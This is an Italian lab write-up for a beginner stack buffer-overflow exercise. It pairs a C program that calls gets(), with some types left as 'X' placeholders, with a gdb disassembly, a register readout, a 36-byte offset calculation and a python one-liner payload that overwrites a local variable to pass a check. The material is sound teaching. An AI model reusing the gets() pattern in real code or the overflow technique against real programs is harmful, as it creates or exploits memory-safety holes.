# Esercizio 2.1 – Variante dell'Esercizio 2

```c
#include <stdio.h>
#include <stdint.h>

int main(int argc, char* argv[]){
  X topolino;
  X pluto;
  char buf[X];

  topolino = 0;
  pluto = 0;
  gets(buf);

  if (topolino == xXXXXX){
    printf("Ottimo! Hai modificato correttamente la variabile\n");
  }
  else{
    printf("Sbagliato! Topolino vale: 0x%08x\n", topolino);
  }
}
```

---

## Analisi del Codice Assembly

Osservando il binario con:

```
(gdb) disass main
Dump of assembler code for function main:
   0x0804846b <+0>:     lea    0x4(%esp),%ecx
   0x0804846f <+4>:     and    $0xfffffff0,%esp
   0x08048472 <+7>:     pushl  -0x4(%ecx)
   0x08048475 <+10>:    push   %ebp
   0x08048476 <+11>:    mov    %esp,%ebp
   0x08048478 <+13>:    push   %ecx
   0x08048479 <+14>:    sub    $0x34,%esp
   0x0804847c <+17>:    movl   $0x0,-0xc(%ebp)   ; allocazione topolino
   0x08048483 <+24>:    movw   $0x0,-0xe(%ebp)   ; allocazione pluto
   0x08048489 <+30>:    sub    $0xc,%esp
   0x0804848c <+33>:    lea    -0x30(%ebp),%eax  ; allocazione buffer
   0x0804848f <+36>:    push   %eax
   0x08048490 <+37>:    call   0x8048330 <gets@plt>
   0x08048495 <+42>:    add    $0x10,%esp
   0x08048498 <+45>:    cmpl   $0x41414141,-0xc(%ebp)  ; confronto per l'if
   0x0804849f <+52>:    jne    0x80484b3 <main+72>
   0x080484a1 <+54>:    sub    $0xc,%esp
   0x080484a4 <+57>:    push   $0x8048560
   0x080484a9 <+62>:    call   0x8048340 <puts@plt>
   0x080484ae <+67>:    add    $0x10,%esp
   0x080484b1 <+70>:    jmp    0x80484c6 <main+91>
   0x080484b3 <+72>:    sub    $0x8,%esp
   0x080484b6 <+75>:    pushl  -0xc(%ebp)
   0x080484b9 <+78>:    push   $0x8048594
   0x080484be <+83>:    call   0x8048320 <printf@plt>
   0x080484c3 <+88>:    add    $0x10,%esp
   0x080484c6 <+91>:    mov    $0x0,%eax
   0x080484cb <+96>:    mov    -0x4(%ebp),%ecx
   0x080484ce <+99>:    leave
   0x080484cf <+100>:   lea    -0x4(%ecx),%esp
   0x080484d2 <+103>:   ret
```

### Allocazioni nello Stack

1. `topolino` è memorizzato a `-0xc(%ebp)` (4 byte)
2. `pluto` a `-0xe(%ebp)` (2 byte)
3. Il buffer è a `-0x30(%ebp)`, passato poi a `gets()` in `%eax`
4. Il valore di confronto è `0x41414141` (`AAAA` in ASCII)

Per trovare l'**offset**, consideriamo che il buffer inizia a `-0x30(%ebp)` e vogliamo sovrascrivere `topolino` a `-0xc(%ebp)`.

### Breakpoint e Registri

Impostiamo un breakpoint a **main+37** (poco prima della chiamata `gets(buf)`) per leggere i registri:

```
(gdb) b *main+37
Breakpoint 1 at 0x8048490: file esercizio2_1.c, line 12.
(gdb) run
Starting program: /home/tux/Desktop/buffer_overflow/bin/esercizio2_1

Breakpoint 1, 0x08048490 in main (argc=1, argv=0xffffd674) at esercizio2_1.c:12
12              gets(buf);
(gdb) i r
eax            0xffffd598
ebp            0xffffd5c8
...
```

`%eax` = `0xffffd598`  
`%ebp` = `0xffffd5c8`

Quindi l'offset (in byte) dal buffer a `topolino` è:

```
offset = eax - (ebp - 0xc)
        = 0xffffd598 - 0xffffd5c8 + 0xc
        = -36
```

In decimale, corrisponde a **36** byte prima di poter sovrascrivere `topolino`.

### Creazione del Payload

Per impostare `topolino = 0x41414141`, costruiamo un payload di 36 byte + `AAAA`:

```bash
python3 -c 'print("c"*36 + "AAAA")' | ./esercizio2_1
```

Output:

```
Ottimo! Hai modificato correttamente la variabile
```

Così abbiamo sovrascritto `topolino` con il valore desiderato `0x41414141`. L’analisi segue lo stesso principio dell’esercizio 2, ma qui la variabile `topolino` e le dimensioni del buffer differiscono.

